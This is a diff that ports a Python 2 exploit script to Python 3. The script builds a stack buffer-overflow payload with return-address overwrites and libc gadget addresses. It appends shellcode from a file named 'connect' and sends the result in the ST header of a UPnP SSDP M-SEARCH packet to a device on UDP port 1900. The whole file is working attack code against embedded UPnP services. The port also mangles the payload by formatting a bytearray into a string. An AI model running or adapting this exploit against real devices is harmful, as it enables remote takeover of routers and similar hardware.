@@ -3,16 +3,13 @@ import random
 import socket
 import hexdump
 
-
 # 2ae50000
 #-2aef0000 /lib/libc.so.0
-
-
 
 #BSIZE = 0x1b4
 BSIZE = 0x1b0
 
-rdstr = bytearray('\x41'*BSIZE)
+rdstr = bytearray('\x41' * BSIZE, 'UTF-8')
 
 # return address overwrite
 rdstr[0xcc:0xd0] = b'\x2a\xeb\x03\x30' # 0x60330 
@@ -67,10 +64,9 @@ rdstr[0xe8:0xec] = b'\x2a\xe9\x91\x8c' # 0x4918c
 
 o = open('connect','rb')
 data = o.read()
-o.close
+o.close()
 
-
-print len(data)
+print(len(data))
 
 for x in range(0,len(data)):
     rdstr[0x110+x] = data[x]
@@ -79,22 +75,24 @@ for x in range(0,len(data)):
 
 #hexdump.hexdump(data)
 #print '---------------------------------------------------------------------'
-hexdump.hexdump(str(rdstr)) 
+hexdump.hexdump(rdstr) 
 
 
-#UDP_IP = "239.255.255.250"
-UDP_IP = "10.0.0.138"
-UDP_PORT = 1900
-MESSAGE =   "M-SEARCH * HTTP/1.1\r\n"\
-            "Host:239.255.255.250:1900\r\n"\
-            "ST:\"uuid:schemas:device:" + rdstr + ":end\"\r\n"\
-            "Man:\"ssdp:discover\"\r\n"\
-            "MX:2\r\n\r\n"
+#device_ip = "239.255.255.250"
+device_ip = "10.0.0.1"
+upnp_port = 1900
+template =  "M-SEARCH * HTTP/1.1\r\n"\
+           "Host:239.255.255.250:1900\r\n"\
+           "ST:\"uuid:schemas:device:{}:end\"\r\n"\
+           "Man:\"ssdp:discover\"\r\n"\
+           "MX:2\r\n\r\n"
 
-print "UDP target IP:", UDP_IP
-print "UDP target port:", UDP_PORT
+final_message = template.format(rdstr)
+
+print("UDP target IP:", device_ip)
+print("UDP target port:", upnp_port)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 
-sock.setsockopt(socket.SOL_SOCKET, 25, 'eth1')
-sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
+sock.sendto(bytes(final_message, 'UTF-8'), (device_ip, upnp_port))
 
